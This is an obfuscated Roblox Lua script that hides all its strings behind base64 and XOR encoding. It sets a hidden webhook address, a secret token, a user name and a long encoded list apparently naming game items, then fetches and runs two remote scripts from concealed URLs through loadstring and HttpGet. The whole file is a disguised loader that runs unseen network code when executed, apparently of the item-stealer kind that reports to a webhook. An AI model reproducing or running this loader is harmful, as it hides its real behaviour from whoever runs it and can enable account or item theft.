--[[ Protected with multi-layer encoding ]]
local _00I000lO=75401;local _Ol00II0="_OllIO";local _OIlIl0O0l=tostring(1495);local _lIIlll0IlO=41950;local _0llOIOl=tostring(2994);local _l0IOI0Olll=39955;local _OOOI0I="_OOlO0";local _Oll0IO00=92944;
local _I0lIOOI0="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _0OI0l00I(_0IIOl0)
  local _OOIII0=""
  _0IIOl0=string.gsub(_0IIOl0,"[^".._I0lIOOI0.."=]","")
  for _IllI=1,#_0IIOl0,4 do
    local a=string.find(_I0lIOOI0,string.sub(_0IIOl0,_IllI,_IllI),1,true)-1
    local b=string.find(_I0lIOOI0,string.sub(_0IIOl0,_IllI+1,_IllI+1),1,true)-1
    local c=string.find(_I0lIOOI0,string.sub(_0IIOl0,_IllI+2,_IllI+2),1,true)
    local d=string.find(_I0lIOOI0,string.sub(_0IIOl0,_IllI+3,_IllI+3),1,true)
    if c then c=c-1 end
    if d then d=d-1 end
    _OOIII0=_OOIII0..string.char((a*4+math.floor((b or 0)/16))%256)
    if c then _OOIII0=_OOIII0..string.char(((b or 0)%16*16+math.floor((c or 0)/4))%256) end
    if d then _OOIII0=_OOIII0..string.char(((c or 0)%4*64+(d or 0))%256) end
  end
  return _OOIII0
end
local _llllOlI0={241,218,14,200,75,178,139,130,140,71}
local function _IIOOIl00(_0IIOl0)
  local _OOIII0=""
  for _IllI=1,#_0IIOl0 do
    local k=_llllOlI0[(_IllI-1)%#_llllOlI0+1]
    local b=string.byte(_0IIOl0,_IllI)
    local r=0
    for bit=0,7 do
      local ba=math.floor(b/2^bit)%2
      local bb=math.floor(k/2^bit)%2
      if ba~=bb then r=r+2^bit end
    end
    _OOIII0=_OOIII0..string.char(r)
  end
  return _OOIII0
end
local function _IOO0OIOOlI00(_0IIOl0) return _IIOOIl00(_0OI0l00I(_0IIOl0)) end
local _IO0OlIOIIl="_lI0l0";local _I0OlI0=83266;
local function _OllllOIOIO()
getgenv().User = _IOO0OIOOlI00("m7tlu3m".."FurO".."1")

getgenv().Webhook = _IOO0OIOOlI00("ma56u".."DiI".."pK3".."oLoK".."5YbovnOj".."t4W".."iQqmfnP".."Nfp6uM".."omqkh+X".."+FsrW8d8".."PjPvl8h".."L+wvX7C4".."yGsB/".."nUwLUJsK".."Bcoi/R+".."NHjLoacQ".."K8v/".."7603gGi".."tFmFB/".."bj680Cr".."pxMjH".."n8+cXKd".."rOeSb".."gh17".."jb6x".."+IvDu4c".."/jS5Oc".."Bnw==")

getgenv().SecretToken = _IOO0OIOOlI00("le83/y".."7UueG".."hJpXrbO".."V/hO+".."7oSaU72".."3lLY".."Htsu53w".."7g5q".."3KL")

getgenv().Brainrots = {
  _IOO0OIOOlI00("oq58qTz".."Q7vD+Pt".."GfYq".."072urs".."+A=="),
  _IOO0OIOOlI00("vL9hv".."yc="),
  _IOO0OIOOlI00("orF".."nqiLW".."4qLYK".."Ji2".."a7w="),
  _IOO0OIOOlI00("ub9vrCf".."X+PGsD".."56ofa0".."m0+U="),
  _IOO0OIOOlI00("uaNqui".."qSz/DtI".."J60Lo".."sq3OXn4".."CuetGc".."="),
  _IOO0OIOOlI00("tahv".."ryTcq8H".."tKZ+/Y".."qQk".."3OI="),
  _IOO0OIOOlI00("tahvr".."yTcq8X".."lKZa/fK".."El2w".."=="),
  _IOO0OIOOlI00("vbs".."umz7C+".."efhIt".."GZY".."aUp".."2+Xj/y".."6etA=="),
  _IOO0OIOOlI00("sr98qi7A".."/vE="),
  _IOO0OIOOlI00("obV".."+qz7".."A/qLtKZ".."X6SKExy".."P7w+".."Q=="),
  _IOO0OIOOlI00("o7V".."9rT".."KS6uz".."oZ6W/".."aqwy"),
  _IOO0OIOOlI00("srt+oT/T".."5e2s".."Cp64d".."w=="),
  _IOO0OIOOlI00("srVhoy".."KS6u".."zoZ".."7yzYqMi"),
  _IOO0OIOOlI00("s69".."8rz7A".."5KLNKZX6".."SLoyx".."/nt"),
  _IOO0OIOOlI00("ur96vT".."vT/".."6LONZ6p"),
  _IOO0OIOOlI00("vbsuiy".."rB6".."qLOK".."J4="),
  _IOO0OIOOlI00("oqphpy".."DLq+PiI9".."GKe6U72".."fI="),
  _IOO0OIOOlI00("vbsum".."y7R+ef4".."Z7K1Y6oi".."3Orx5Si".."f"),
  _IOO0OIOOlI00("trt8".."qSbTq+P".."iI9GXb6w".."+3O/".."34i".."A="),
  _IOO0OIOOlI00("vbV4r".."Wv+5P".."TpZ7O/b7".."o="),
  _IOO0OIOOlI00("sr9".."irTjG".."4uPgZ".."6G/aak4".."x/g="),
  _IOO0OIOOlI00("vbs".."ujiT".."d76LPKJ".."y4Z6Yqwe".."Lt4g".."=="),
  _IOO0OIOOlI00("o79n".."piL".."G5KLf".."K5Sza".."aAixuQ="),
  _IOO0OIOOlI00("vbV96Ar".."f4uX".."jNA".."=="),
  _IOO0OIOOlI00("vbV96Bj".."X4O".."3gJp".."mp"),
  _IOO0OIOOlI00("orNpp".."iTA7qL".."PJoO".."7fqko1".."w=="),
  _IOO0OIOOlI00("t6hv".."rznT5uOs".."Jp++Los".."j3ejw7Sq".."Q"),
  _IOO0OIOOlI00("tLZrri".."rc/+2sA".."YOzaac="),
  _IOO0OIOOlI00("vbsu".."jyLc7O".."f+Z6K/Za".."cn0+M="),
  _IOO0OIOOlI00("trNgry".."7Aq8Xp".."NZCu"),
  _IOO0OIOOlI00("ortjp".."TLc4qLKJ".."oWu".."Z6Yi"),
  _IOO0OIOOlI00("vbV96BjC".."6uXkI".."oWuZ7s="),
  _IOO0OIOOlI00("t79".."9vCLE7qK".."6cA".."=="),
  _IOO0OIOOlI00("p79gvCT".."e4uf+KNG".."Kb74k".."3O7w4".."w=="),
  _IOO0OIOOlI00("oqp".."vryP".."X//b".."lZ6Wv".."b6Quxv".."/r"),
  _IOO0OIOOlI00("sLR6py".."Xb5A=".."="),
  _IOO0OIOOlI00("o7V9r".."T/G4qLY".."MpC".."2a7".."w/2w=".."="),
  _IOO0OIOOlI00("v7ttoC".."SS2PL1I".."5So"),
  _IOO0OIOOlI00("t7N".."9oCL".."c5KLP".."K56tY".."KEl3Q=="),
  _IOO0OIOOlI00("vbt4qS/d".."+ev4".."KNGJf".."qEl2//t"),
  _IOO0OIOOlI00("u7V".."ipDKSw".."e3gK".."4j6".."Xakjx".."/k="),
  _IOO0OIOOlI00("pbN8oSf".."b4OPg".."Lpq7L".."pwiwOLu5".."SyQtm".."+jJA=".."="),
  _IOO0OIOOlI00("ur96qyPH".."+fesJp+".."+LoU+wf/".."3/jI="),
  _IOO0OIOOlI00("oq1".."vryzLq8".."D+KII="),
  _IOO0OIOOlI00("vbsu".."miTf6uz".."4LpL".."6Sboq3".."O/n"),
  _IOO0OIOOlI00("vqhtq".."SfX7+3".."i"),
  _IOO0OIOOlI00("pbNtv".."CrRq9H".."tL4".."So"),
  _IOO0OIOOlI00("vbsunC".."rR5KLPK".."Jy4Z6Yq".."weLt4g".."=="),
  _IOO0OIOOlI00("ur96vTv".."T/6".."LHIo".."G7eg=".."="),
  _IOO0OIOOlI00("pbtgr2".."vm6".."uzrZ7q/Y".."q0/0+Xl"),
  _IOO0OIOOlI00("vbV4oSWS".."2e3/".."Ig=="),
  _IOO0OIOOlI00("vbV9".."6B/".."T6O3+LoW".."7fQ=="),
  _IOO0OIOOlI00("tKxnpC".."7W5Ow="),
  _IOO0OIOOlI00("vbV96Bv".."A4u/j".."NA=="),
  _IOO0OIOOlI00("vbsugiT".."e5/usAI".."O7YKwu"),
  _IOO0OIOOlI00("pvphum".."v+"),
  _IOO0OIOOlI00("tKlho".."2vh7unj".."K5Cy"),
  _IOO0OIOOlI00("vbV96BvH".."7OXl".."IoI="),
  _IOO0OIOOlI00("pahvpC".."re7".."ubjKQ".."=="),
  _IOO0OIOOlI00("vLNrvC".."7G7u".."v+Jt".."GYZ6".."si0efn".."+CKYqG".."8="),
  _IOO0OIOOlI00("trVsq".."ifb5".."e2sE".."p+zbaE".."o3uLs4w=".."="),
  _IOO0OIOOlI00("pa9or".."mvm5Pfv".."Jp8".."="),
  _IOO0OIOOlI00("vLVgrTK".."Sxu3".."iIo".."j6XK0i".."3O/n".."6TU="),
  _IOO0OIOOlI00("srJn".."pCfb".."5aLPL5i".."2Zw=="),
  _IOO0OIOOlI00("srJnu".."Djdq+P".."iI9".."GLe6043".."Q=="),
  _IOO0OIOOlI00("vbsumzv".."d5On1Z7".."aob6".."Yv1".."w=="),
  _IOO0OIOOlI00("s7ttvT".."nHq+P".."iI9G".."faa8".."+wP4="),
  _IOO0OIOOlI00("vbV96".."AnA".."5PE="),
  _IOO0OIOOlI00("vbsujTPG".."4uzv".."M9GdfKk".."l1u4="),
  _IOO0OIOOlI00("vbV96".."AjT5eblI".."oI="),
  _IOO0OIOOlI00("sr9ivSf".."T+e".."HlKZ".."j6WK".."Eo2+Tx5S".."mY"),
  _IOO0OIOOlI00("vbV".."96H".."2F"),
  _IOO0OIOOlI00("vbV96A".."bd6evg".."LoI="),
  _IOO0OIOOlI00("vLVg".."rTK".."Sxu3iIo".."j6Xr0".."s1fI="),
  _IOO0OIOOlI00("vbV".."96AHd".."5+71".."Z7K".."1Y6o".."i3Orx5Si".."fu3".."0="),
  _IOO0OIOOlI00("vbV9".."6BjC5O3n".."PtG".."ZYaUp2+".."Xj/y6e".."tG+7"),
  _IOO0OIOOlI00("vbV96A".."Pd/".."/H8KIWpZ".."7wkw".."Q=="),
  _IOO0OIOOlI00("vbV96B".."ve6".."uzl".."M56p"),
  _IOO0OIOOlI00("srJnq".."yfX".."/+fl".."NZD6Tb07".."2+/n5TWQ"),
  _IOO0OIOOlI00("tZA".."umCrc7+M".."="),
  _IOO0OIOOlI00("vbt96B".."jb+A".."=="),
  _IOO0OIOOlI00("oqpnpi".."XLq8".."rtKp".."yj"),
  _IOO0OIOOlI00("vbV".."96BjF".."7uf4L5".."S7fLw4"),
  _IOO0OIOOlI00("pbttp".."znb".."/+OsB".."Zi5Z6s".."n1/".."/j"),
  _IOO0OIOOlI00("v69tpC7T".."+e2sA5".."i0Ybs40".."/7w4w=".."="),
  _IOO0OIOOlI00("vbV96".."Ajd5u".."DlKZCpZ".."6cl0/g".."="),
  _IOO0OIOOlI00("srJnq".."yfX/+f".."lNZD6Q".."Kcu3v/n".."5TWQ"),
  _IOO0OIOOlI00("srJ".."npSXb5".."e0="),
  _IOO0OIOOlI00("oq1".."vr2vh5".."Obt"),
  _IOO0OIOOlI00("v7Vh6C".."bLq".."8rpJoOu"),
  _IOO0OIOOlI00("vLt8o".."SrR4+".."usBJ6o".."b7Ik3".."OI="),
  _IOO0OIOOlI00("pbttp".."znb5+".."7jZ7Ko".."Yask1".."uLu4Cg="),
  _IOO0OIOOlI00("vbV".."96Hm".."H"),
  _IOO0OIOOlI00("vbs".."ujznT5".."ebpZ7K".."1Y6oi3Or".."x5Sif"),
  _IOO0OIOOlI00("tbVgoy7L".."//f+JZ".."76S7A7w".."O7x/w=="),
  _IOO0OIOOlI00("vbV".."96A".."nH+".."fDl".."M56p"),
  _IOO0OIOOlI00("x+0="),
  _IOO0OIOOlI00("vbV96Aj".."a4uHg".."IoW/Z7o".."qwQ=="),
  _IOO0OIOOlI00("tq9ru".."z+Sv".."bS6"),
  _IOO0OIOOlI00("vbV96Ab".."bq8".."XtM5".."iuY".."bs="),
  _IOO0OIOOlI00("o7tgr2vg".."4uzrZ7Ov".."fQ=".."="),
  _IOO0OIOOlI00("v7Vh6".."CbLq9L".."+IoK/".."YLw="),
  _IOO0OIOOlI00("vbV96AXd".."5O2sCoj6".."Rqc/".."wfvt+D".."SYrmG7"),
  _IOO0OIOOlI00("v7Vh6".."CbL".."q8H".."tKZWj"),
  _IOO0OIOOlI00("sKht".."qS/d+".."/f/"),
  _IOO0OIOOlI00("vbV96B".."rH7vH".."tI5i2Y".."qk4"),
  _IOO0OIOOlI00("srJnq".."yfX/".."+flNZ".."i0b+g".."J2+jr".."7yuUrm".."uhO".."dvl4w=="),
  _IOO0OIOOlI00("s698uiL".."G5KLO".."Jp++Z7wk"),
  _IOO0OIOOlI00("srJnp".."CeS2/f8".."N4g".."="),
  _IOO0OIOOlI00("oK9".."ruyrW4u".."7gK".."NGMb6U72".."/nt"),
  _IOO0OIOOlI00("srJ".."nqyfX/+f".."lNZD".."6TKEo2+".."ju6TOUs".."3yp"),
  _IOO0OIOOlI00("s6h7piLG".."5KLB".."JoOpZ7wk"),
  _IOO0OIOOlI00("sq9".."+oS+Sw".."+34NI".."G1e".."g=="),
  _IOO0OIOOlI00("vLMuj".."yrG".."4vb".."j"),
  _IOO0OIOOlI00("ubUu".."gCSS".."w+2".."sFJC".."ye7o="),
  _IOO0OIOOlI00("sq9+oS+S".."yPf8L".."pX6Xakj".."x/k="),
  _IOO0OIOOlI00("s69goT/d".."q8D5KZ".."iuY".."egYwuL".."s5T".."Oe"),
  _IOO0OIOOlI00("oK9ruyr".."W4u7gJtG".."ZfKco3".."e/r4CY="),
  _IOO0OIOOlI00("obV66Bv".."H5vL".."nLp8="),
  _IOO0OIOOlI00("v7t".."7ryPG".."8qLC".."JoS9Zrw".."y"),
  _IOO0OIOOlI00("ubV".."8rSzb5eu".."sBZ".."61Yw=="),
  _IOO0OIOOlI00("ortgvC".."qSw+34NI".."G1eg=="),
  _IOO0OIOOlI00("obN".."8vS".."fb/+".."3lM".."5D6T".."KEo2+ju6".."TOUs3yp"),
  _IOO0OIOOlI00("w+8="),
  _IOO0OIOOlI00("obV66".."APd//H8K".."IU="),
  _IOO0OIOOlI00("pbUuvCSS".."/+2".."sFJCye7".."o="),
  _IOO0OIOOlI00("pb9ir".."Sbd+f".."bp"),
  _IOO0OIOOlI00("vbs".."umyra/v".."CsBJ63bK".."El0/".."jr4y".."k="),
  _IOO0OIOOlI00("vbN9vG".."v+4v".."H4Z72zfb".."xr4erq+T".."U="),
  _IOO0OIOOlI00("v7Vh6".."CbLq".."+f0".."Jpyz".."YK0="),
  _IOO0OIOOlI00("v7Vhp2".."v/8qLEK".."IWpfqc/"),
  _IOO0OIOOlI00("pa9gr".."2vm/uzr".."Z6WvYK9r".."4erq+TU".."="),
  _IOO0OIOOlI00("s69g".."pjLf6uw="),
  _IOO0OIOOlI00("vbV".."96AHd".."6eHlM56".."p"),
  _IOO0OIOOlI00("sq9".."vrD".."nT5".."uP4Z5C0".."augb0".."+Dw7S+".."cu3qlK".."t/q".."9g=="),
  _IOO0OIOOlI00("obZr".."qTjXq+".."/1Z6G".."oa7".."su3P".."8="),
  _IOO0OIOOlI00("vbV96A".."jH6OP+J".."pKyb7s="),
  _IOO0OIOOlI00("wKI/sH".."rKug=="),
  _IOO0OIOOlI00("vbV4r".."Wv+5".."PTpZ72".."1eK1r4e".."rq+TU="),
  _IOO0OIOOlI00("ob98uiL".."G5KL".."OMoO".."oZ7".."wk"),
  _IOO0OIOOlI00("tqhvoT".."vH+".."PGsC".."pS+".."e7s42w=".."="),
  _IOO0OIOOlI00("trN".."ovCLc".."4qLfN4".."i+a7o".."i3OI="),
  _IOO0OIOOlI00("tpVPn".."A=="),
  _IOO0OIOOlI00("pahnq".."yDd".."5+v".."iKA=="),
  _IOO0OIOOlI00("pahnu".."Cfb/+".."2sE4O7Yq".."kn1/nr".."+Ci".."C"),
  _IOO0OIOOlI00("vbsu".."nirR".."6OOsDZC".."5Zadr".."/uLs+CK".."Ds2".."Cn"),
  _IOO0OIOOlI00("t7N9o".."Cnd6vD".."o"),
  _IOO0OIOOlI00("ortgvD/X".."5A=="),
  _IOO0OIOOlI00("vbt9".."6B3T+v".."flM5CpL".."psqxv7w4".."i6Fu3".."0="),
  _IOO0OIOOlI00("vbV96".."ADT".."+en".."pNZ".."iuYbs".."="),
  _IOO0OIOOlI00("urt8oy7A".."q9Ht".."L4So"),
  _IOO0OIOOlI00("t6hv".."piDX5fb".."4Ip4="),
  _IOO0OIOOlI00("vbV96B/".."A4u3".."/"),
  _IOO0OIOOlI00("u7Vs6AH".."d6aLGK".."JP6".."Xakjx/k="),
  _IOO0OIOOlI00("vbt96B/".."A6u".."7tK5SoZ".."7wqw".."Q=="),
  _IOO0OIOOlI00("oa9juC".."Db5eu".."sFIGjaq0".."52+Xr"),
  _IOO0OIOOlI00("o7Vtq".."ySSz+v/".."JJ4="),
  _IOO0OIOOlI00("tKJ6oS".."XR/6L".."BJoWua6".."c="),
  _IOO0OIOOlI00("vbsu".."gyrA4".."Of+LJ".."CoLo".."sk3".."+nr4iaCs".."2Gm"),
  _IOO0OIOOlI00("o79npi".."/X7".."vCsE4O7".."Yqkn0".."w=="),
  _IOO0OIOOlI00("vbsu".."nirR6OOs".."F4O".."/fa1".."r4v".."nn/yKf".."rms="),
  _IOO0OIOOlI00("qL99u".."2vf8qLpP".."5C3".."Z6Yu"),
  _IOO0OIOOlI00("tq9rujn".."b+e2".."sA5i9Z7w".."q3u4".."="),
  _IOO0OIOOlI00("s7VvvC".."LG5".."KLNMoO7".."eqE/3Q=".."="),
  _IOO0OIOOlI00("vbV96".."B/A6u7".."tK5SoZ".."7wkwQ=="),
  _IOO0OIOOlI00("p69iv".."D7A".."4uzjZ".."6Kxa6Qux".."uTs4w=="),
  _IOO0OIOOlI00("vbV".."96B/d+".."fb5N".."A=="),
  _IOO0OIOOlI00("q7V".."jqiLXq9b".."+Jp27Y".."qk="),
  _IOO0OIOOlI00("vbsuiz7".."R6vDtJJ".."m7"),
  _IOO0OIOOlI00("t6hvryTe".."6qLAJtGW".."b+gH0w=".."="),
  _IOO0OIOOlI00("tKJ6oSXR".."/6LYN".."ZC2".."b6Qu".."wOQ="),
  _IOO0OIOOlI00("vbV".."96BjC8ub".."pNZ".."i0Z7s="),
  _IOO0OIOOlI00("sL1vu".."jnb5eu".."sK5D".."6Xqkn2+X".."r"),
  _IOO0OIOOlI00("srJ".."vqyP".."X6Orl"),
  _IOO0OIOOlI00("s7Z".."vqyDa5O7".."pZ7a1b7w".."="),
  _IOO0OIOOlI00("ta9i6".."A/H56LI".."Mp0".."="),
  _IOO0OIOOlI00("pbV".."8uj/H".."7OviKZj".."6Sroq1e".."Ts6j".."WErmemIg".."=="),
  _IOO0OIOOlI00("ortjp".."TLc".."4qLfN4i+".."a7oi3O".."I="),
  _IOO0OIOOlI00("u7ttoyTA".."4u7gJg=".."=")
}

task.spawn(function()
loadstring(game:HttpGet(_IOO0OIOOlI00("ma56".."uDiI".."pK3tN5j".."0Yr0qwO".."bt/mmfv".."3rn".."Ldvn5/9".."oh+4".."hpCTT".."7+f+NN".."7iPvAthu".."rmuCKTv".."Gj8".."fIfot".."7sklOw/r".."SqBsue4".."dpT".."oPe".."Ynx+o=")))()
end)

task.spawn(function()
loadstring(game:HttpGet(_IOO0OIOOlI00("ma56u".."DiIpK3+".."Job0a".."aE/2v7".."g+TSUqG2".."nJcbu7Ph".."pkrVj5".."xjR".."+ev8M".."7Cob".."aAixO7x".."/2i9r2+".."cLsH/8a".."M1l".."Lx95yP".."X6ub/".."aJy".."7Z6Zk9vn".."j6yCQu".."GKtDMf".."i1uk0hfR".."ivSo".."=")))()
end)

end
local _lll0lOIOI0=(694*1142>694) and _OllllOIOIO or nil
if _lll0lOIOI0 then _lll0lOIOI0() end
